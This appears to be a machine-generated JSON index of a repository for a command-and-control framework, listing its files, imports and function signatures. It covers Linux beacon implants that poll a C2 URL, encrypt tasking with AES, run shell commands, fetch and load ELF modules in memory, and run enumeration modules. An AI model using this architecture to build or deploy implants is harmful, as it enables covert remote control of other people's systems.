"relation": "imports", "source": "tests/test_install_deploy.py", "target": "pathlib"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "aes.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon3.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon3.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon3.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon5.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon5.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon5.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon6.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon6.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon6.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon_p2p.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon_p2p.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacon_p2p.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacons/v1/beacon.c", "target": "include/beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacons/v2/beacon.c", "target": "include/beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "beacons/v3/beacon.c", "target": "include/beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/cat/bof.c", "target": "bof/include/beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/cat/bof.c", "target": "bof/include/syscalls.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/is_sudo/bof.c", "target": "bof/include/beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/is_sudo/bof.c", "target": "bof/include/syscalls.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/suid_enum/bof.c", "target": "bof/include/beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/suid_enum/bof.c", "target": "bof/include/syscalls.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/userenum/bof.c", "target": "bof/include/beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/userenum/bof.c", "target": "bof/include/syscalls.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/whoami/bof.c", "target": "bof/include/beacon_api.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof/whoami/bof.c", "target": "bof/include/syscalls.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "bof.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "c2/server.py", "target": "include/config_py.py"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "cJSON.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "gopher_beacon.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "gopher_beacon.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "gopher_beacon.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/aes.c", "target": "include/aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/aes_cfb.c", "target": "include/aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/beacon_common.c", "target": "include/beacon_common.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/beacon_common.c", "target": "include/aes.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/beacon_common.c", "target": "include/cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/beacon_common.h", "target": "include/config.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/cJSON.c", "target": "include/cJSON.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "include/config.c", "target": "include/config.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "tests/config_harness.c", "target": "include/config.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "tests/crypto_harness.c", "target": "include/aes_cfb.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "tests/test_c2_server.py", "target": "c2/server.py"}], "generator": "readmenator", "metadata": {"edge_count": 1325, "file_count": 52, "language_count": 4, "symbol_count": 1458}, "nodes": [{"doc": "aes.c - tiny-AES-c (https://github.com/kokke/tiny-AES-c) include \"aes.h\" include <string.h>  define Nb 4    define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16", "id": "aes.c", "kind": "module", "label": "aes.c", "language": "c", "sha256": "180163905daaf34d", "symbol_count": 44, "symbols": [{"doc": "define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16", "kind": "function", "line": 12, "name": "getSBoxValue", "signature": "static uint8_t getSBoxValue(uint8_t num)"}, {"kind": "function", "line": 34, "name": "getSBoxInvert", "signature": "static uint8_t getSBoxInvert(uint8_t num)"}, {"kind": "function", "line": 56, "name": "Td0", "signature": "static uint8_t Td0(int x)"}, {"kind": "function", "line": 58, "name": "Td1", "signature": "static uint8_t Td1(int x)"}, {"kind": "function", "line": 59, "name": "Td2", "signature": "static uint8_t Td2(int x)"}, {"kind": "function", "line": 60, "name": "Td3", "signature": "static uint8_t Td3(int x)"}, {"kind": "function", "line": 61, "name": "Td4", "signature": "static uint8_t Td4(int x)"}, {"doc": "This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.", "kind": "function", "line": 166, "name": "KeyExpansion", "signature": "static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)"}, {"kind": "function", "line": 238, "name": "AES_init_ctx", "signature": "void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)"}, {"doc": "if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))", "kind": "function", "line": 244, "name": "AES_init_ctx_iv", "signature": "void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)"}, {"kind": "function", "line": 249, "name": "AES_ctx_set_iv", "signature": "void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)"}, {"doc": "This function adds the round key to state. The round key is added to the state by an XOR function.", "kind": "function", "line": 257, "name": "AddRoundKey", "signature": "static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)"}, {"doc": "The SubBytes Function Substitutes the values in the state matrix with values in an S-box.", "kind": "function", "line": 271, "name": "SubBytes", "signature": "static void SubBytes(state_t* state)"}, {"doc": "The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = Row number. So the first row is not shifted.", "kind": "function", "line": 286, "name": "ShiftRows", "signature": "static void ShiftRows(state_t* state)"}, {"kind": "function", "line": 313, "name": "xtime", "signature": "static uint8_t xtime(uint8_t x)"}, {"doc": "MixColumns function mixes the columns of the state matrix", "kind": "function", "line": 320, "name": "MixColumns", "signature": "static void MixColumns(state_t* state)"}, {"doc": "Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary The compiler seems to be able to vectorize the operation better this way. See https://github.com/kokke/tiny-AES-c/pull/34 if MULTIPLY_AS_A_FUNCTION", "kind": "function", "line": 340, "name": "Multiply", "signature": "static uint8_t Multiply(uint8_t x, uint8_t y)"}, {"doc": "MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand for the inexperienced. Please use the references to gain more information.", "kind": "function", "line": 370, "name": "InvMixColumns", "signature": "static void InvMixColumns(state_t* state)"}, {"doc": "The SubBytes Function Substitutes the values in the state matrix with values in an S-box.", "kind": "function", "line": 391, "name": "InvSubBytes", "signature": "static void InvSubBytes(state_t* state)"}, {"kind": "function", "line": 402, "name": "InvShiftRows", "signature": "static void InvShiftRows(state_t* state)"}, {"doc": "Cipher is the main function that encrypts the PlainText.", "kind": "function", "line": 433, "name": "Cipher", "signature": "static void Cipher(state_t* state, const uint8_t* RoundKey)"}, {"doc": "if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)", "kind": "function", "line": 459, "name": "InvCipher", "signature": "static void InvCipher(state_t* state, const uint8_t* RoundKey)"}, {"doc": "AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)  /* Public functions:  if defined(ECB) && (ECB == 1)", "kind": "function", "line": 488, "name": "AES_ECB_encrypt", "signature": "void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)"}, {"kind": "function", "line": 495, "name": "AES_ECB_decrypt", "signature": "void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)"}, {"doc": "if defined(CBC) && (CBC == 1)", "kind": "function", "line": 510, "name": "XorWithIv", "signature": "static void XorWithIv(uint8_t* buf, const uint8_t* Iv)"}, {"kind": "function", "line": 520, "name": "AES_CBC_encrypt_buffer", "signature": "void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)"}, {"kind": "function", "line": 535, "name": "AES_CBC_decrypt_buffer", "signature": "void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)"}, {"doc": "XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key", "kind": "function", "line": 558, "name": "AES_CTR_xcrypt_buffer", "signature": "void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)"}, {"kind": "function", "line": 247, "name": "memcpy", "signature": "memcpy (ctx->Iv, iv, AES_BLOCKLEN);"}, {"kind": "macro", "line": 4, "name": "Nb", "signature": "#define Nb"}, {"kind": "macro", "line": 6, "name": "KEYLEN_256", "signature": "#define KEYLEN_256"}, {"kind": "macro", "line": 10, "name": "RKLENGTH", "signature": "#define RKLENGTH"}, {"kind": "macro", "line": 11, "name": "BLOCKLEN", "signature": "#define BLOCKLEN"}, {"kind": "macro", "line": 67, "name": "Nb", "signature": "#define Nb"}, {"kind": "macro", "line": 70, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 71, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 73, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 74, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 76, "name": "Nk", "signature": "#define Nk"}, {"kind": "macro", "line": 77, "name": "Nr", "signature": "#define Nr"}, {"kind": "macro", "line": 84, "name": "MULTIPLY_AS_A_FUNCTION", "signature": "#define MULTIPLY_AS_A_FUNCTION"}, {"kind": "macro", "line": 163, "name": "getSBoxValue", "signature": "#define getSBoxValue(num)"}, {"kind": "macro", "line": 349, "name": "Multiply", "signature": "#define Multiply(x, y)"}, {"kind": "macro", "line": 365, "name": "getSBoxInvert", "signature": "#define getSBoxInvert(num)"}]}, {"doc": "ifndef _AES_H_ define _AES_H_  include <stdint.h> include <stddef.h>  #define the macros below to 1/0 to enable/disable the mode of operation. ifndef CBC define CBC 1 endif ifndef ECB define ECB 1 endif ifndef CTR define CTR 1 endif  define AES256 1  // ✅ Clave de 256 bits  define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only  if defined(AES256) && (AES256 == 1) define AES_KEYLEN 32 define AES_keyExpSize 240 elif defined(AES192) && (AES192 == 1) define AES_KEYLEN 24 define AES_keyExpSize 208 else define AES_KEYLEN 16   // Key length in bytes define AES_keyExpSize 176", "id": "aes.h", "kind": "module", "label": "aes.h", "language": "h", "sha256": "2fe7e7b8c7087857", "symbol_count": 21, "symbols": [{"kind": "struct", "line": 33, "name": "AES_ctx"}, {"kind": "function", "line": 40, "name": "AES_init_ctx", "signature": "void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);"}, {"doc": "if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))", "kind": "function", "line": 43, "name": "AES_init_ctx_iv", "signature": "void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);"}, {"kind": "function", "line": 44, "name": "AES_ctx_set_iv", "signature": "void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);"}, {"doc": "if defined(ECB) && (ECB == 1)", "kind": "function", "line": 48, "name": "AES_ECB_encrypt", "signature": "void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);"}, {"kind": "function", "line": 49, "name": "AES_ECB_decrypt", "signature": "void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);"}, {"doc": "if defined(CBC) && (CBC == 1)", "kind": "function", "line": 53, "name": "AES_CBC_encrypt_buffer", "signature": "void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"kind": "function", "line": 54, "name": "AES_CBC_decrypt_buffer", "signature": "void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"doc": "if defined(CTR) && (CTR == 1)", "kind": "function", "line": 58, "name": "AES_CTR_xcrypt_buffer", "signature": "void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);"}, {"kind": "macro", "line": 2, "name": "_AES_H_", "signature": "#define _AES_H_"}, {"kind": "macro", "line": 9, "name": "CBC", "signature": "#define CBC"}, {"kind": "macro", "line": 12, "name": "ECB", "signature": "#define ECB"}, {"kind": "macro", "line": 15, "name": "CTR", "signature": "#define CTR"}, {"kind": "macro", "line": 17, "name": "AES256", "signature": "#define AES256"}, {"kind": "macro", "line": 19, "name": "AES_BLOCKLEN", "signature": "#define AES_BLOCKLEN"}, {"kind": "macro", "line": 23, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": "macro", "line": 24, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}, {"kind": "macro", "line": 26, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": "macro", "line": 27, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}, {"kind": "macro", "line": 29, "name": "AES_KEYLEN", "signature": "#define AES_KEYLEN"}, {"kind": "macro", "line": 30, "name": "AES_keyExpSize", "signature": "#define AES_keyExpSize"}]}, {"doc": "_*_ coding: utf8 _*_", "id": "app.py", "kind": "module", "label": "app.py", "language": "py", "sha256": "57b21bdb023585b8", "symbol_count": 0, "symbols": []}, {"doc": "beacon_api.h ifndef BEACON_API_H define BEACON_API_H  include <stdint.h> include <stdarg.h>  Tipos de callback define CALLBACK_OUTPUT 0x00 define CALLBACK_ERROR  0x0D define CALLBACK_OUTPUT_OEM 0x0E  Estructura para parsing de datos (opcional, para comandos complejos)", "id": "beacon.h", "kind": "module", "label": "beacon.h", "language": "h", "sha256": "38133982452f4d76", "symbol_count": 13, "symbols": [{"doc": "Estructura para parsing de datos (opcional, para comandos complejos)", "kind": "struct", "line": 14, "name": "datap"}, {"doc": "=== API para BOFs ===", "kind": "function", "line": 21, "name": "BeaconDataParse", "signature": "void BeaconDataParse(datap *parser, char *buffer, int size);"}, {"kind": "function", "line": 22, "name": "BeaconDataPtr", "signature": "char *BeaconDataPtr(datap *parser, int size);"}, {"kind": "function", "line": 23, "name": "BeaconDataInt", "signature": "int BeaconDataInt(datap *parser);"}, {"kind": "function", "line": 24, "name": "BeaconDataShort", "signature": "short BeaconDataShort(datap *parser);"}, {"kind": "function", "line": 25, "name": "BeaconDataLength", "signature": "int BeaconDataLength(datap *parser);"}, {"kind": "function", "line": 26, "name": "BeaconDataExtract", "signature": "char *BeaconDataExtract(datap *parser, int *size);"}, {"kind": "function", "line": 27, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...);"}, {"kind": "function", "line": 28, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len);"}, {"kind": "macro", "line": 3, "name": "BEACON_API_H", "signature": "#define BEACON_API_H"}, {"kind": "macro", "line": 9, "name": "CALLBACK_OUTPUT", "signature": "#define CALLBACK_OUTPUT"}, {"kind": "macro", "line": 10, "name": "CALLBACK_ERROR", "signature": "#define CALLBACK_ERROR"}, {"kind": "macro", "line": 11, "name": "CALLBACK_OUTPUT_OEM", "signature": "#define CALLBACK_OUTPUT_OEM"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h>  include \"beacon.h\" include \"aes.h\"", "id": "beacon3.c", "kind": "module", "label": "beacon3.c", "language": "c", "sha256": "0b76c30ef1c69312", "symbol_count": 66, "symbols": [{"doc": "=== ESTRUCTURAS ===", "kind": "struct", "line": 50, "name": "MemoryStruct"}, {"doc": "=== TRAMPOLINES ===", "kind": "struct", "line": 57, "name": "Trampoline"}, {"kind": "struct", "line": 65, "name": "SymbolResolver"}, {"doc": "=== CACHE DE TRAMPOLINES ===", "kind": "struct", "line": 71, "name": "TrampolineCache"}, {"kind": "function", "line": 140, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"doc": "=== BEACON API ===", "kind": "function", "line": 193, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 205, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "=== CRATE TRAPOLINE ===", "kind": "function", "line": 217, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"doc": "=== CLEAN TRAMPOLINE ===", "kind": "function", "line": 253, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 268, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"doc": "=== CURL WRITE CALLBACK ===", "kind": "function", "line": 300, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"doc": "=== HTTPS REQUEST ===", "kind": "function", "line": 317, "name": "https_request", "signature": "char* https_request(const char* url, const char* method, const char* post_data)"}, {"doc": "=== BASE64 ===", "kind": "function", "line": 406, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 422, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"doc": "=== AES CFB ===", "kind": "function", "line": 446, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 473, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "=== EXEC CMD ===", "kind": "function", "line": 504, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"doc": "=== Función auxiliar: alinear al tamaño de página ===", "kind": "function", "line": 525, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 530, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, \n           unsi..."}, {"doc": "=== GET LOCAL IPs ===", "kind": "function", "line": 912, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"doc": "=== DOWNLOAD BOF ===", "kind": "function", "line": 941, "name": "download_bof", "signature": "unsigned char* download_bof(const char* url, size_t* out_size)"}, {"doc": "=== RUN BOF AND CAPTURE ===", "kind": "function", "line": 963, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "=== MAIN ===", "kind": "function", "line": 1007, "name": "main", "signature": "int main()"}, {"doc": "=== TIPOS Y SÍMBOLOS FALTANTES ===", "kind": "function", "line": 63, "name": "void", "signature": "typedef void (*bof_func_t)(char*, int);"}, {"doc": "CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el push del return address) Entonces necesitamos RSP % 16 == 8 justo antes del call", "kind": "function", "line": 146, "name": "volatile", "signature": "asm volatile( // Guardar frame pointer \"push %%rbp\\n\\t\" \"mov %%rsp, %%rbp\\n\\t\" // Guardar callee-saved registers \"push %%rbx\\n\\t\" \"push %%r12\\n\\t\" \"push %%r13\\n\\t\" \"push %%r14\\n\\t\" \"push %%r15\\n\\t\" //"}, {"kind": "function", "line": 196, "name": "va_start", "signature": "va_start(args, fmt);"}, {"kind": "function", "line": 200, "name": "va_end", "signature": "va_end(args);"}, {"kind": "function", "line": 211, "name": "memcpy", "signature": "memcpy(g_beacon_output + g_output_len, data, len);"}, {"kind": "function", "line": 224, "name": "fprintf", "signature": "fprintf(stderr, \"[!] Trampolín: mmap falló\\n\");"}, {"kind": "function", "line": 240, "name": "munmap", "signature": "munmap(code, code_size);"}, {"kind": "function", "line": 257, "name": "free", "signature": "free(g_trampolines);"}, {"kind": "function", "line": 321, "name": "fflush", "signature": "fflush(stderr);"}, {"kind": "function", "line": 335, "name": "curl_easy_setopt", "signature": "curl_easy_setopt(curl, CURLOPT_URL, url);"}, {"kind": "function", "line": 380, "name": "curl_easy_cleanup", "signature": "curl_easy_cleanup(curl);"}, {"kind": "function", "line": 412, "name": "BIO_set_flags", "signature": "BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);"}, {"kind": "function", "line": 413, "name": "BIO_write", "signature": "BIO_write(b64, input, len);"}, {"kind": "function", "line": 414, "name": "BIO_flush", "signature": "BIO_flush(b64);"}, {"kind": "function", "line": 415, "name": "BIO_get_mem_ptr", "signature": "BIO_get_mem_ptr(b64, &bptr);"}, {"kind": "function", "line": 419, "name": "BIO_free_all", "signature": "BIO_free_all(b64);"}, {"kind": "function", "line": 449, "name": "AES_init_ctx", "signature": "AES_init_ctx(&ctx, key);"}, {"kind": "function", "line": 457, "name": "AES_ECB_encrypt", "signature": "AES_ECB_encrypt(&ctx, encrypted_iv);"}, {"kind": "function", "line": 466, "name": "memset", "signature": "memset(iv_buf + block_size, 0, 16 - block_size);"}, {"kind": "function", "line": 509, "name": "pclose", "signature": "pclose(fp);"}, {"kind": "function", "line": 701, "name": "perror", "signature": "perror(\"calloc\");"}, {"kind": "function", "line": 897, "name": "call_bof_isolated", "signature": "call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);"}, {"kind": "function", "line": 920, "name": "close", "signature": "close(sockfd);"}, {"kind": "function", "line": 921, "name": "strdup", "signature": "return strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 931, "name": "inet_ntop", "signature": "inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);"}, {"kind": "function", "line": 933, "name": "strcat", "signature": "strcat(result, ip);"}, {"kind": "function", "line": 937, "name": "strlen", "signature": "return strlen(result) > 0 ? result : strdup(\"127.0.0.1\");"}, {"kind": "function", "line": 952, "name": "printf", "signature": "printf(\"[DEBUG] download_bof: descargados %zu bytes\\n\", *out_size);"}, {"kind": "function", "line": 1009, "name": "srand", "signature": "srand(time(NULL));"}, {"kind": "function", "line": 1013, "name": "sscanf", "signature": "sscanf(KEY_HEX + i * 2, \"%2hhx\", &AES_KEY[i]);"}, {"kind": "function", "line": 1017, "name": "snprintf", "signature": "snprintf(full_url, sizeof(full_url), \"%s%s%s\", C2_URL, MALEABLE, CLIENT_ID);"}, {"kind": "function", "line": 1030, "name": "sleep", "signature": "sleep(6);"}, {"kind": "function", "line": 1122, "name": "gethostname", "signature": "gethostname(hostname, sizeof(hostname) - 1);"}, {"kind": "function", "line": 1130, "name": "cJSON_AddStringToObject", "signature": "cJSON_AddStringToObject(root, \"output\", output);"}, {"kind": "function", "line": 1133, "name": "cJSON_AddNumberToObject", "signature": "cJSON_AddNumberToObject(root, \"pid\", (double)getpid());"}, {"kind": "function", "line": 1138, "name": "cJSON_AddNullToObject", "signature": "cJSON_AddNullToObject(root, \"result_portscan\");"}, {"kind": "function", "line": 1142, "name": "cJSON_Delete", "signature": "cJSON_Delete(root);"}, {"kind": "function", "line": 1158, "name": "RAND_bytes", "signature": "RAND_bytes(iv_out, 16);"}, {"kind": "macro", "line": 1, "name": "_GNU_SOURCE", "signature": "#define _GNU_SOURCE"}, {"kind": "macro", "line": 32, "name": "C2_URL", "signature": "#define C2_URL"}, {"kind": "macro", "line": 34, "name": "CLIENT_ID", "signature": "#define CLIENT_ID"}, {"kind": "macro", "line": 35, "name": "MALEABLE", "signature": "#define MALEABLE"}, {"kind": "macro", "line": 36, "name": "USER_AGENTS_COUNT", "signature": "#define USER_AGENTS_COUNT"}]}, {"doc": "define _GNU_SOURCE include <stdio.h> include <stdlib.h> include <string.h> include <unistd.h> include <time.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <arpa/inet.h> include <net/if.h> include <sys/ioctl.h> include <pwd.h> include <errno.h> include <openssl/buffer.h> include <curl/curl.h> include <openssl/rand.h> include <openssl/bio.h> include <openssl/evp.h> include <sys/mman.h> include <elf.h> include <dlfcn.h> include <fcntl.h> include <stdint.h> include <sys/wait.h> include <stdarg.h> include <netdb.h> include <pthread.h> include <arpa/inet.h> include <sys/select.h>", "id": "beacon5.c", "kind": "module", "label": "beacon5.c", "language": "c", "sha256": "daea4e92d0f388eb", "symbol_count": 94, "symbols": [{"doc": "=== ESTRUCTURAS ===", "kind": "struct", "line": 61, "name": "MemoryStruct"}, {"doc": "=== ESTRUCTURAS MESH ===", "kind": "struct", "line": 68, "name": "peer_t"}, {"kind": "struct", "line": 75, "name": "mesh_msg_t"}, {"doc": "=== TRAMPOLINES ===", "kind": "struct", "line": 98, "name": "Trampoline"}, {"kind": "struct", "line": 106, "name": "SymbolResolver"}, {"doc": "=== CACHE DE TRAMPOLINES ===", "kind": "struct", "line": 112, "name": "TrampolineCache"}, {"kind": "function", "line": 182, "name": "__attribute__", "signature": "static void __attribute__((noinline))\ncall_bof_isolated(bof_func_t func, char* args, uintptr_t ar..."}, {"doc": "=== BEACON API ===", "kind": "function", "line": 235, "name": "BeaconPrintf", "signature": "void BeaconPrintf(int type, const char *fmt, ...)"}, {"kind": "function", "line": 247, "name": "BeaconOutput", "signature": "void BeaconOutput(int type, const char *data, int len)"}, {"doc": "=== CRATE TRAPOLINE ===", "kind": "function", "line": 259, "name": "create_trampoline", "signature": "static void* create_trampoline(void* target)"}, {"doc": "=== CLEAN TRAMPOLINE ===", "kind": "function", "line": 295, "name": "cleanup_trampolines", "signature": "static void cleanup_trampolines(void)"}, {"kind": "function", "line": 310, "name": "get_or_create_trampoline", "signature": "static void* get_or_create_trampoline(void* target)"}, {"doc": "=== CURL WRITE CALLBACK ===", "kind": "function", "line": 342, "name": "WriteMemoryCallback", "signature": "static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)"}, {"doc": "=== HTTPS REQUEST ===", "kind": "function", "line": 359, "name": "https_request", "signature": "char* https_request(const char* url, const char* method, const char* post_data)"}, {"doc": "=== BASE64 ===", "kind": "function", "line": 448, "name": "base64_encode", "signature": "char* base64_encode(const unsigned char* input, int len)"}, {"kind": "function", "line": 464, "name": "base64_decode", "signature": "unsigned char* base64_decode(const char* input, int* len)"}, {"doc": "=== AES CFB ===", "kind": "function", "line": 488, "name": "aes256_cfb_encrypt", "signature": "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"kind": "function", "line": 515, "name": "aes256_cfb_decrypt", "signature": "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n            ..."}, {"doc": "=== EXEC CMD ===", "kind": "function", "line": 546, "name": "exec_cmd", "signature": "char* exec_cmd(const char* cmd, int* out_len)"}, {"doc": "=== Función auxiliar: alinear al tamaño de página ===", "kind": "function", "line": 567, "name": "page_align", "signature": "static size_t page_align(size_t size)"}, {"kind": "function", "line": 572, "name": "RunELF", "signature": "int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, \n           unsi..."}, {"doc": "=== GET LOCAL IPs ===", "kind": "function", "line": 954, "name": "get_local_ips", "signature": "char* get_local_ips()"}, {"doc": "=== DOWNLOAD BOF ===", "kind": "function", "line": 983, "name": "download_bof", "signature": "unsigned char* download_bof(const char* url, size_t* out_size)"}, {"doc": "=== RUN BOF AND CAPTURE ===", "kind": "function", "line": 1005, "name": "run_bof_and_capture", "signature": "char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,\n                          c..."}, {"doc": "========== UTILIDADES MESH ==========", "kind": "function", "line": 1049, "name": "mesh_mark_seen", "signature": "void mesh_mark_seen(const char *msg_id)"}, {"kind": "function", "line": 1057, "name": "mesh_is_seen", "signature": "int mesh_is_seen(const char *msg_id)"}, {"kind": "function", "line": 1069, "name": "mesh_add_peer", "signature": "void 